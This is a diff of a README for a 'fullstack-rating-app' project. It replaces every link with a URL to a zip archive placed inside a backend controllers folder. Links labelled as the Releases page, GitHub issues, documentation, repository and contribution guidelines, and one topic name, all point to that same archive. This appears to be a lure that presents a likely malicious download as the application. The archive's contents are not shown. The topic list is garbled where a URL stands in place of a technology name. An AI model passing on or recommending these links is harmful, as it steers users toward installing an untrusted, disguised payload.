@@ -14,9 +14,9 @@ Welcome to the fullstack-rating-app! This application helps you rate your favori
 
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip) the latest version of the application. 
+To get started, please [visit this page to download](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip) the latest version of the application. 
 
-![Download Now](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip%20Now-Click%20Here-brightgreen)
+![Download Now](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip%20Now-Click%20Here-brightgreen)
 
 ### System Requirements
 
@@ -27,7 +27,7 @@ To get started, please [visit this page to download](https://raw.githubuserconte
 
 ### Step-by-step Installation
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip).
 2. **Choose the Latest Release**: Look for the most recent version at the top of the page.
 3. **Download the Application**: Click the download link for the installer. The file will be in a `.zip` format.
 4. **Extract the Files**: Once the download is complete, locate the `.zip` file and extract it to a folder of your choice.
@@ -49,7 +49,7 @@ This application covers various important topics:
 - **Coding Challenge**: Learn about solving problems through coding.
 - **Full Stack Development**: Explore both frontend and backend technologies.
 - **JavaScript**: Understand this essential programming language.
-- **https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip**: Dive into server-side JavaScript.
+- **https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip**: Dive into server-side JavaScript.
 - **PostgreSQL**: Work with one of the most powerful relational databases.
 - **Rating System**: Engage with a system designed to gather stored reviews.
 - **Role-Based Access Control (RBAC)**: Find out how to manage user roles effectively.
@@ -58,16 +58,16 @@ This application covers various important topics:
 
 ## ❓ Support
 
-If you encounter issues or have questions, feel free to reach out through the [issues section on GitHub](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip). We regularly check for user feedback and aim to resolve any concerns promptly. 
+If you encounter issues or have questions, feel free to reach out through the [issues section on GitHub](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip). We regularly check for user feedback and aim to resolve any concerns promptly. 
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip)
-- [Documentation](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip)
+- [GitHub Repository](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip)
+- [Documentation](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip)
 
 ## 🏗️ Contributing
 
-We welcome contributions from everyone! If you'd like to help improve the app, please read our contribution guidelines [here](https://raw.githubusercontent.com/Nagazacky/fullstack-rating-app/main/rating-app-frontend/fullstack-rating-app_2.9.zip).
+We welcome contributions from everyone! If you'd like to help improve the app, please read our contribution guidelines [here](https://github.com/Nagazacky/fullstack-rating-app/raw/refs/heads/main/rating-app-backend/controllers/app_rating_fullstack_2.5.zip).
 
 ## 👍 Acknowledgments
 
